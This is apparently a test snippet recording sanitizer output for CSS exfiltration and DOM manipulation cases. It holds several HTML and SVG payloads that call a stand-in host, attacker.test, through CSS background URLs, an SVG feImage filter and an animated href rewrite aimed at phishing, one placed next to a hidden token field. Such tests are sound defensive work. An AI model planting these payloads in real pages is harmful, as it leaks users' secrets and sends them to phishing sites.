# %%
# CSS exfiltration and DOM manipulation tests
# Out:
# <input type="hidden" id="secret" value="TOKEN123"><svg><rect width="100" height="100" fill="red" style="background:url(http://attacker.test/css?leak=)"></rect></svg>
# <svg><rect width="100%" height="100%" style="fill:url(#x);background:red"></rect></svg>
# <svg><a id="xss-link"><set attributeName="href" to="http://attacker.test/phish?target=parent" begin="0s"></set><rect width="100" height="50" fill="green"/></a></svg>
# <svg><filter id="leak"><feimage href="http://attacker.test/svg-filter"></feimage></filter><rect filter="url(#leak)" width="100" height="100"/></svg>
# <div style="background:url(http://attacker.test/css-bg)">CSS leak test</div>
